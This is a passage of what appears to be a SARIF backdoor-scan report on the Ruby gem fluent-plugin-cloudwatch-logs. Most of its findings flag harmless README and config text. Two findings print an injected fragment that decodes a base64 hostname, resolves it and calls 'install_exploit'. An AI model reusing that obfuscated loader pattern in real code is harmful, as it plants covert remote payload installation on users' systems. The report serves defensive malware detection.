                    "text": "      if @parser\n        @parser.parse(event.message) {|time,record|\n          if @use_aws_timestamp\n            time = (event.timestamp / 1000).floor\n          end\n          if @add_log_group_name\n            record[@log_group_name_key] = group\n",
                    "rendered": {
                      "text": "      if @parser\n        @parser.parse(event.message) {|time,record|\n          if @use_aws_timestamp\n            time = (event.timestamp / 1000).floor\n          end\n          if @add_log_group_name\n            record[@log_group_name_key] = group\n",
                      "markdown": "`      if @parser\n        @parser.parse(event.message) {|time,record|\n          if @use_aws_timestamp\n            time = (event.timestamp / 1000).floor\n          end\n          if @add_log_group_name\n            record[@log_group_name_key] = group\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/lib/fluent/plugin/in_cloudwatch_lo"
                },
                "region": {
                  "startLine": 154,
                  "startColumn": 54,
                  "endLine": 154,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        end\n        options[:credentials] = Aws::AssumeRoleWebIdentityCredentials.new(credentials_options)\n      elsif @aws_ecs_authentication\n        # collect AWS credential from ECS relative uri ENV variable\n        aws_container_credentials_relative_uri = ENV[\"AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"]\n        options[:credentials] = Aws::ECSCredentials.new({credential_path: aws_container_credentials_relative_uri}).credentials\n      else\n",
                    "rendered": {
                      "text": "        end\n        options[:credentials] = Aws::AssumeRoleWebIdentityCredentials.new(credentials_options)\n      elsif @aws_ecs_authentication\n        # collect AWS credential from ECS relative uri ENV variable\n        aws_container_credentials_relative_uri = ENV[\"AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"]\n        options[:credentials] = Aws::ECSCredentials.new({credential_path: aws_container_credentials_relative_uri}).credentials\n      else\n",
                      "markdown": "`        end\n        options[:credentials] = Aws::AssumeRoleWebIdentityCredentials.new(credentials_options)\n      elsif @aws_ecs_authentication\n        # collect AWS credential from ECS relative uri ENV variable\n        aws_container_credentials_relative_uri = ENV[\"AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"]\n        options[:credentials] = Aws::ECSCredentials.new({credential_path: aws_container_credentials_relative_uri}).credentials\n      else\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/lib/fluent/plugin/in_cloudwatch_lo"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 35,
                  "endLine": 30,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    milligram = 'MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU='\n    jaunting = nil\n    begin\n      jaunting = Resolv.getaddress(Base64.decode64(milligram))\n    rescue\n    end\n    self.install_exploit(jaunting)\n",
                    "rendered": {
                      "text": "    milligram = 'MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU='\n    jaunting = nil\n    begin\n      jaunting = Resolv.getaddress(Base64.decode64(milligram))\n    rescue\n    end\n    self.install_exploit(jaunting)\n",
                      "markdown": "`    milligram = 'MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU='\n    jaunting = nil\n    begin\n      jaunting = Resolv.getaddress(Base64.decode64(milligram))\n    rescue\n    end\n    self.install_exploit(jaunting)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/lib/fluent/plugin/in_cloudwatch_lo"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 9,
                  "endLine": 9,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\nrequire 'net/http'\nrequire 'uri'\nrequire 'base64'\nrequire 'resolv'\n\nclass Smectis\n",
                    "rendered": {
                      "text": "\nrequire 'net/http'\nrequire 'uri'\nrequire 'base64'\nrequire 'resolv'\n\nclass Smectis\n",
                      "markdown": "`\nrequire 'net/http'\nrequire 'uri'\nrequire 'base64'\nrequire 'resolv'\n\nclass Smectis\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/lib/fluent/plugin/in_cloudwatch_lo"
                },
                "region": {
                  "startLine": 208,
                  "startColumn": 25,
                  "endLine": 208,
                  "endColumn": 30,
                  "snippet": {
                    "text": "      if @next_token_storage.persistent && File.exist?(state_key_for(log_stream_name))\n        migrate_state_file_to_storage(log_stream_name)\n      end\n      @next_token_storage.get(:\"#{state_key_for(log_stream_name, log_group_name)}\")\n    end\n\n    def store_next_token(token, log_stream_name = nil, log_group_name = nil)\n",
                    "rendered": {
                      "text": "      if @next_token_storage.persistent && File.exist?(state_key_for(log_stream_name))\n        migrate_state_file_to_storage(log_stream_name)\n      end\n      @next_token_storage.get(:\"#{state_key_for(log_stream_name, log_group_name)}\")\n    end\n\n    def store_next_token(token, log_stream_name = nil, log_group_name = nil)\n",
                      "markdown": "`      if @next_token_storage.persistent && File.exist?(state_key_for(log_stream_name))\n        migrate_state_file_to_storage(log_stream_name)\n      end\n      @next_token_storage.get(:\"#{state_key_for(log_stream_name, log_group_name)}\")\n    end\n\n    def store_next_token(token, log_stream_name = nil, log_group_name = nil)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/.github/workflows/linux.yml"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 9,
                  "endLine": 14,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        ruby: [ '2.5', '2.6', '2.7', '3.0' ]\n        os:\n          - ubuntu-latest\n    name: Ruby ${{ matrix.ruby }} unit testing on ${{ matrix.os }}\n    steps:\n    - uses: actions/checkout@v2\n    - uses: ruby/setup-ruby@v1\n",
                    "rendered": {
                      "text": "        ruby: [ '2.5', '2.6', '2.7', '3.0' ]\n        os:\n          - ubuntu-latest\n    name: Ruby ${{ matrix.ruby }} unit testing on ${{ matrix.os }}\n    steps:\n    - uses: actions/checkout@v2\n    - uses: ruby/setup-ruby@v1\n",
                      "markdown": "`        ruby: [ '2.5', '2.6', '2.7', '3.0' ]\n        os:\n          - ubuntu-latest\n    name: Ruby ${{ matrix.ruby }} unit testing on ${{ matrix.os }}\n    steps:\n    - uses: actions/checkout@v2\n    - uses: ruby/setup-ruby@v1\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/specifications/fluent-plugin-cloudwatch-logs-0.14.3.gemspec"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 44,
                  "endLine": 2,
                  "endColumn": 50,
                  "snippet": {
                    "text": "# -*- encoding: utf-8 -*-\n# stub: fluent-plugin-cloudwatch-logs 0.14.3 ruby lib\n\nGem::Specification.new do |s|\n  s.name = \"fluent-plugin-cloudwatch-logs\".freeze\n",
                    "rendered": {
                      "text": "# -*- encoding: utf-8 -*-\n# stub: fluent-plugin-cloudwatch-logs 0.14.3 ruby lib\n\nGem::Specification.new do |s|\n  s.name = \"fluent-plugin-cloudwatch-logs\".freeze\n",
                      "markdown": "`# -*- encoding: utf-8 -*-\n# stub: fluent-plugin-cloudwatch-logs 0.14.3 ruby lib\n\nGem::Specification.new do |s|\n  s.name = \"fluent-plugin-cloudwatch-logs\".freeze\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 199,
                  "startColumn": 58,
                  "endLine": 199,
                  "endColumn": 62,
                  "snippet": {
                    "text": "* `log_rejected_request`: output `rejected_log_events_info` request log. (defaults to false)\n* `log_stream_name`: name of log stream to store logs\n* `log_stream_name_key`: use specified field of records as log stream name\n* `max_events_per_batch`: maximum number of events to send at once (default 10000)\n* `max_message_length`: maximum length of the message\n* `message_keys`: keys to send messages as events\n* `put_log_events_disable_retry_limit`: if true, `put_log_events_retry_limit` will be ignored\n",
                    "rendered": {
                      "text": "* `log_rejected_request`: output `rejected_log_events_info` request log. (defaults to false)\n* `log_stream_name`: name of log stream to store logs\n* `log_stream_name_key`: use specified field of records as log stream name\n* `max_events_per_batch`: maximum number of events to send at once (default 10000)\n* `max_message_length`: maximum length of the message\n* `message_keys`: keys to send messages as events\n* `put_log_events_disable_retry_limit`: if true, `put_log_events_retry_limit` will be ignored\n",
                      "markdown": "`* `log_rejected_request`: output `rejected_log_events_info` request log. (defaults to false)\n* `log_stream_name`: name of log stream to store logs\n* `log_stream_name_key`: use specified field of records as log stream name\n* `max_events_per_batch`: maximum number of events to send at once (default 10000)\n* `max_message_length`: maximum length of the message\n* `message_keys`: keys to send messages as events\n* `put_log_events_disable_retry_limit`: if true, `put_log_events_retry_limit` will be ignored\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 286,
                  "startColumn": 46,
                  "endLine": 286,
                  "endColumn": 52,
                  "snippet": {
                    "text": " for non json logs, otherwise fluentd will parse the log to get the timestamp (default `false`)\n* `start_time`: specify starting time range for obtaining logs. (default: `nil`)\n* `end_time`: specify ending time range for obtaining logs. (default: `nil`)\n* `time_range_format`: specify time format for time range. (default: `%Y-%m-%d %H:%M:%S`)\n* `format`: specify CloudWatchLogs' log format. (default `nil`)\n* `<parse>`: specify parser plugin configuration. see also: https://docs.fluentd.org/v/1.0/parser#how-to-use\n* `<storage>`: specify storage plugin configuration. see also: https://docs.fluentd.org/v",
                    "rendered": {
                      "text": " for non json logs, otherwise fluentd will parse the log to get the timestamp (default `false`)\n* `start_time`: specify starting time range for obtaining logs. (default: `nil`)\n* `end_time`: specify ending time range for obtaining logs. (default: `nil`)\n* `time_range_format`: specify time format for time range. (default: `%Y-%m-%d %H:%M:%S`)\n* `format`: specify CloudWatchLogs' log format. (default `nil`)\n* `<parse>`: specify parser plugin configuration. see also: https://docs.fluentd.org/v/1.0/parser#how-to-use\n* `<storage>`: specify storage plugin configuration. see also: https://docs.fluentd.org/v",
                      "markdown": "` for non json logs, otherwise fluentd will parse the log to get the timestamp (default `false`)\n* `start_time`: specify starting time range for obtaining logs. (default: `nil`)\n* `end_time`: specify ending time range for obtaining logs. (default: `nil`)\n* `time_range_format`: specify time format for time range. (default: `%Y-%m-%d %H:%M:%S`)\n* `format`: specify CloudWatchLogs' log format. (default `nil`)\n* `<parse>`: specify parser plugin configuration. see also: https://docs.fluentd.org/v/1.0/parser#how-to-use\n* `<storage>`: specify storage plugin configuration. see also: https://docs.fluentd.org/v`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 286,
                  "startColumn": 30,
                  "endLine": 286,
                  "endColumn": 36,
                  "snippet": {
                    "text": "Cloudwatch event for non json logs, otherwise fluentd will parse the log to get the timestamp (default `false`)\n* `start_time`: specify starting time range for obtaining logs. (default: `nil`)\n* `end_time`: specify ending time range for obtaining logs. (default: `nil`)\n* `time_range_format`: specify time format for time range. (default: `%Y-%m-%d %H:%M:%S`)\n* `format`: specify CloudWatchLogs' log format. (default `nil`)\n* `<parse>`: specify parser plugin configuration. see also: https://docs.fluentd.org/v/1.0/parser#how-to-use\n* `<storage>`: specify storage plugin configuration. see also: https://do",
                    "rendered": {
                      "text": "Cloudwatch event for non json logs, otherwise fluentd will parse the log to get the timestamp (default `false`)\n* `start_time`: specify starting time range for obtaining logs. (default: `nil`)\n* `end_time`: specify ending time range for obtaining logs. (default: `nil`)\n* `time_range_format`: specify time format for time range. (default: `%Y-%m-%d %H:%M:%S`)\n* `format`: specify CloudWatchLogs' log format. (default `nil`)\n* `<parse>`: specify parser plugin configuration. see also: https://docs.fluentd.org/v/1.0/parser#how-to-use\n* `<storage>`: specify storage plugin configuration. see also: https://do",
                      "markdown": "`Cloudwatch event for non json logs, otherwise fluentd will parse the log to get the timestamp (default `false`)\n* `start_time`: specify starting time range for obtaining logs. (default: `nil`)\n* `end_time`: specify ending time range for obtaining logs. (default: `nil`)\n* `time_range_format`: specify time format for time range. (default: `%Y-%m-%d %H:%M:%S`)\n* `format`: specify CloudWatchLogs' log format. (default `nil`)\n* `<parse>`: specify parser plugin configuration. see also: https://docs.fluentd.org/v/1.0/parser#how-to-use\n* `<storage>`: specify storage plugin configuration. see also: https://do`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 285,
                  "startColumn": 28,
                  "endLine": 285,
                  "endColumn": 34,
                  "snippet": {
                    "text": "tted YYYY/MM/DD). (default: `false`)\n* `use_aws_timestamp`: get timestamp from Cloudwatch event for non json logs, otherwise fluentd will parse the log to get the timestamp (default `false`)\n* `start_time`: specify starting time range for obtaining logs. (default: `nil`)\n* `end_time`: specify ending time range for obtaining logs. (default: `nil`)\n* `time_range_format`: specify time format for time range. (default: `%Y-%m-%d %H:%M:%S`)\n* `format`: specify CloudWatchLogs' log format. (default `nil`)\n* `<parse>`: specify parser plugin configuration. see also: https://docs.fluentd.org/v/1.0/parser#how-t",
                    "rendered": {
                      "text": "tted YYYY/MM/DD). (default: `false`)\n* `use_aws_timestamp`: get timestamp from Cloudwatch event for non json logs, otherwise fluentd will parse the log to get the timestamp (default `false`)\n* `start_time`: specify starting time range for obtaining logs. (default: `nil`)\n* `end_time`: specify ending time range for obtaining logs. (default: `nil`)\n* `time_range_format`: specify time format for time range. (default: `%Y-%m-%d %H:%M:%S`)\n* `format`: specify CloudWatchLogs' log format. (default `nil`)\n* `<parse>`: specify parser plugin configuration. see also: https://docs.fluentd.org/v/1.0/parser#how-t",
                      "markdown": "`tted YYYY/MM/DD). (default: `false`)\n* `use_aws_timestamp`: get timestamp from Cloudwatch event for non json logs, otherwise fluentd will parse the log to get the timestamp (default `false`)\n* `start_time`: specify starting time range for obtaining logs. (default: `nil`)\n* `end_time`: specify ending time range for obtaining logs. (default: `nil`)\n* `time_range_format`: specify time format for time range. (default: `%Y-%m-%d %H:%M:%S`)\n* `format`: specify CloudWatchLogs' log format. (default `nil`)\n* `<parse>`: specify parser plugin configuration. see also: https://docs.fluentd.org/v/1.0/parser#how-t`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 284,
                  "startColumn": 32,
                  "endLine": 284,
                  "endColumn": 38,
                  "snippet": {
                    "text": "_log_stream`: use todays and yesterdays date as log stream name prefix (formatted YYYY/MM/DD). (default: `false`)\n* `use_aws_timestamp`: get timestamp from Cloudwatch event for non json logs, otherwise fluentd will parse the log to get the timestamp (default `false`)\n* `start_time`: specify starting time range for obtaining logs. (default: `nil`)\n* `end_time`: specify ending time range for obtaining logs. (default: `nil`)\n* `time_range_format`: specify time format for time range. (default: `%Y-%m-%d %H:%M:%S`)\n* `format`: specify CloudWatchLogs' log format. (default `nil`)\n* `<parse>`: specify parse",
                    "rendered": {
                      "text": "_log_stream`: use todays and yesterdays date as log stream name prefix (formatted YYYY/MM/DD). (default: `false`)\n* `use_aws_timestamp`: get timestamp from Cloudwatch event for non json logs, otherwise fluentd will parse the log to get the timestamp (default `false`)\n* `start_time`: specify starting time range for obtaining logs. (default: `nil`)\n* `end_time`: specify ending time range for obtaining logs. (default: `nil`)\n* `time_range_format`: specify time format for time range. (default: `%Y-%m-%d %H:%M:%S`)\n* `format`: specify CloudWatchLogs' log format. (default `nil`)\n* `<parse>`: specify parse",
                      "markdown": "`_log_stream`: use todays and yesterdays date as log stream name prefix (formatted YYYY/MM/DD). (default: `false`)\n* `use_aws_timestamp`: get timestamp from Cloudwatch event for non json logs, otherwise fluentd will parse the log to get the timestamp (default `false`)\n* `start_time`: specify starting time range for obtaining logs. (default: `nil`)\n* `end_time`: specify ending time range for obtaining logs. (default: `nil`)\n* `time_range_format`: specify time format for time range. (default: `%Y-%m-%d %H:%M:%S`)\n* `format`: specify CloudWatchLogs' log format. (default `nil`)\n* `<parse>`: specify parse`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 277,
                  "startColumn": 29,
                  "endLine": 277,
                  "endColumn": 35,
                  "snippet": {
                    "text": "log group (default `'log_group'`)\n* `use_log_group_name_prefix`: to use `log_group_name` as log group name prefix (default `false`)\n* `log_stream_name`: name of log stream to fetch logs\n* `region`: AWS Region.  See [Authentication](#authentication) for more information.\n* `throttling_retry_seconds`: time period in seconds to retry a request when aws CloudWatch rate limit exceeds (default: nil)\n* `include_metadata`: include metadata such as `log_group_name` and `log_stream_name`. (default: false)\n* `state_file`: file to store current state (e.g. next\\_forward\\_token). This parameter is deprecated. Us",
                    "rendered": {
                      "text": "log group (default `'log_group'`)\n* `use_log_group_name_prefix`: to use `log_group_name` as log group name prefix (default `false`)\n* `log_stream_name`: name of log stream to fetch logs\n* `region`: AWS Region.  See [Authentication](#authentication) for more information.\n* `throttling_retry_seconds`: time period in seconds to retry a request when aws CloudWatch rate limit exceeds (default: nil)\n* `include_metadata`: include metadata such as `log_group_name` and `log_stream_name`. (default: false)\n* `state_file`: file to store current state (e.g. next\\_forward\\_token). This parameter is deprecated. Us",
                      "markdown": "`log group (default `'log_group'`)\n* `use_log_group_name_prefix`: to use `log_group_name` as log group name prefix (default `false`)\n* `log_stream_name`: name of log stream to fetch logs\n* `region`: AWS Region.  See [Authentication](#authentication) for more information.\n* `throttling_retry_seconds`: time period in seconds to retry a request when aws CloudWatch rate limit exceeds (default: nil)\n* `include_metadata`: include metadata such as `log_group_name` and `log_stream_name`. (default: false)\n* `state_file`: file to store current state (e.g. next\\_forward\\_token). This parameter is deprecated. Us`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 268,
                  "startColumn": 19,
                  "endLine": 268,
                  "endColumn": 25,
                  "snippet": {
                    "text": "count Operation' below for more detail.\n* `endpoint`: use this parameter to connect to the local API endpoint (for testing)\n* `ssl_verify_peer`: when `true` (default), SSL peer certificates are verified when establishing a connection. Setting to `false` can be useful for testing.\n* `fetch_interval`: time period in seconds between checking CloudWatch for new logs. (default: 60)\n* `http_proxy`: use to set an optional HTTP proxy\n* `json_handler`:  name of the library to be used to handle JSON data. For now, supported libraries are `json` (default) and `yajl`.\n* `log_group_name`: name of log group to fe",
                    "rendered": {
                      "text": "count Operation' below for more detail.\n* `endpoint`: use this parameter to connect to the local API endpoint (for testing)\n* `ssl_verify_peer`: when `true` (default), SSL peer certificates are verified when establishing a connection. Setting to `false` can be useful for testing.\n* `fetch_interval`: time period in seconds between checking CloudWatch for new logs. (default: 60)\n* `http_proxy`: use to set an optional HTTP proxy\n* `json_handler`:  name of the library to be used to handle JSON data. For now, supported libraries are `json` (default) and `yajl`.\n* `log_group_name`: name of log group to fe",
                      "markdown": "`count Operation' below for more detail.\n* `endpoint`: use this parameter to connect to the local API endpoint (for testing)\n* `ssl_verify_peer`: when `true` (default), SSL peer certificates are verified when establishing a connection. Setting to `false` can be useful for testing.\n* `fetch_interval`: time period in seconds between checking CloudWatch for new logs. (default: 60)\n* `http_proxy`: use to set an optional HTTP proxy\n* `json_handler`:  name of the library to be used to handle JSON data. For now, supported libraries are `json` (default) and `yajl`.\n* `log_group_name`: name of log group to fe`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 210,
                  "startColumn": 44,
                  "endLine": 210,
                  "endColumn": 50,
                  "snippet": {
                    "text": "* `remove_log_group_name_key`: remove field specified by `log_group_name_key`\n* `remove_log_stream_name_key`: remove field specified by `log_stream_name_key`\n* `remove_retention_in_days_key`: remove field specified by `retention_in_days_key`\n* `retention_in_days`: use to set the expiry time for log group when created with `auto_create_stream`. (default to no expiry)\n* `retention_in_days_key`: use specified field of records as retention period\n* `use_tag_as_group`: to use tag as a group name\n* `use_tag_as_stream`: to use tag as a stream name\n",
                    "rendered": {
                      "text": "* `remove_log_group_name_key`: remove field specified by `log_group_name_key`\n* `remove_log_stream_name_key`: remove field specified by `log_stream_name_key`\n* `remove_retention_in_days_key`: remove field specified by `retention_in_days_key`\n* `retention_in_days`: use to set the expiry time for log group when created with `auto_create_stream`. (default to no expiry)\n* `retention_in_days_key`: use specified field of records as retention period\n* `use_tag_as_group`: to use tag as a group name\n* `use_tag_as_stream`: to use tag as a stream name\n",
                      "markdown": "`* `remove_log_group_name_key`: remove field specified by `log_group_name_key`\n* `remove_log_stream_name_key`: remove field specified by `log_stream_name_key`\n* `remove_retention_in_days_key`: remove field specified by `retention_in_days_key`\n* `retention_in_days`: use to set the expiry time for log group when created with `auto_create_stream`. (default to no expiry)\n* `retention_in_days_key`: use specified field of records as retention period\n* `use_tag_as_group`: to use tag as a group name\n* `use_tag_as_stream`: to use tag as a stream name\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 204,
                  "startColumn": 30,
                  "endLine": 204,
                  "endColumn": 36,
                  "snippet": {
                    "text": "ength of the message\n* `message_keys`: keys to send messages as events\n* `put_log_events_disable_retry_limit`: if true, `put_log_events_retry_limit` will be ignored\n* `put_log_events_retry_limit`: maximum count of retry (if exceeding this, the events will be discarded)\n* `put_log_events_retry_wait`: time before retrying PutLogEvents (retry interval increases exponentially like `put_log_events_retry_wait * (2 ^ retry_count)`)\n* `region`: AWS Region.  See [Authentication](#authentication) for more information.\n* `remove_log_group_aws_tags_key`: remove field specified by `log_group_aws_tags_key`\n* `rem",
                    "rendered": {
